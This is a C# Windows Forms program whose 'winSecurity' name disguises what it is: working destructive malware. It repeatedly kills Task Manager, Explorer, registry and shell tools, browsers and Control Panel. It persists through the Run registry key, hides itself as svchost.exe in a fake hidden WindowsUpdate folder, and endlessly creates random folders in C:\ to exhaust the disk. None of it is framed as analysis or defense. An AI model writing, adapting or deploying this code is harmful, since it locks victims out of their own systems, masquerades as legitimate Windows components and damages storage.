using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winSecurity
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public static void kill_process()
        {
            while (true)
            {
                foreach (Process proc in Process.GetProcessesByName("regedit"))
                {
                    proc.Kill();
                }
                foreach (Process proc in Process.GetProcessesByName("explorer"))
                {
                    proc.Kill();
                }
                foreach (Process proc in Process.GetProcessesByName("ProcessHacker"))
                {
                    proc.Kill();
                }
                foreach (Process proc in Process.GetProcessesByName("cmd"))
                {
                    proc.Kill();
                }
                foreach (Process proc in Process.GetProcessesByName("powershell"))
                {
                    proc.Kill();
                }
                foreach (Process proc in Process.GetProcessesByName("Taskmgr"))
                {
                    proc.Kill();
                }
                foreach (Process proc in Process.GetProcessesByName("chrome"))
                {
                    proc.Kill();
                }
                foreach (Process proc in Process.GetProcessesByName("iexplore"))
                {
                    proc.Kill();
                }
                foreach (Process proc in Process.GetProcessesByName("edge"))
                {
                    proc.Kill();
                }
                foreach (Process proc in Process.GetProcessesByName("control"))
                {
                    proc.Kill();
                }

                Thread.Sleep(50);
            }
        }

        public static void create_autorun()
        {
            Microsoft.Win32.RegistryKey autorun =
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            autorun.SetValue("System32", Application.ExecutablePath);

            //string fileFolder = @"C:\Drivers";
            //string fileName = @"C:\Drivers\svchost.exe";
            string fileFolder = @"C:\WindowsUpdate\";
            string fileName = @"C:\WindowsUpdate\svchost.exe";
            try
            {
                string myfile = System.Reflection.Assembly.GetEntryAssembly().Location;
                File.SetAttributes(myfile, FileAttributes.Hidden);
                if (Directory.Exists(fileFolder))
                {
                    //   Process.Start(fileName); hahah tyt rzach
                }
                else if (!Directory.Exists(fileFolder))
                {
                    System.IO.Directory.CreateDirectory(fileFolder);
                    File.SetAttributes(fileFolder, FileAttributes.Hidden);
                    File.Move(myfile, fileName);
                    File.Delete(myfile);
                    File.SetAttributes(fileName, FileAttributes.Hidden);

                    Process.Start(fileName);
                }
            }
            catch { }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Thread t1 = new Thread(kill_process);
            t1.Start();
            Thread t2 = new Thread(create_autorun);
            t2.Start();
            Task.Run(() =>
            {
                int num_letters = 15;
                int num_words = 1;
                // Создаем массив букв, которые мы будем использовать.
                char[] letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZйцукенгшщзфывапролдячсмить123456780".ToCharArray();

                // Создаем генератор случайных чисел.
                Random rand = new Random();
                while (true)
                {
                    for (int i = 1; i <= num_words; i++)
                    {
                        string word = "";
                        for (int j = 1; j <= num_letters; j++)
                        {
                            // Выбор случайного числа от 0 до n
                            // для выбора буквы из массива букв.
                            int letter_num = rand.Next(0, letters.Length - 1);
                            word += letters[letter_num];
                        }
                        //Console.WriteLine(word);

                        var path = "C:\\";
                        var folder = Path.Combine(path, word);
                        Directory.CreateDirectory(folder);
                    }
                }
            });
        }
    }
}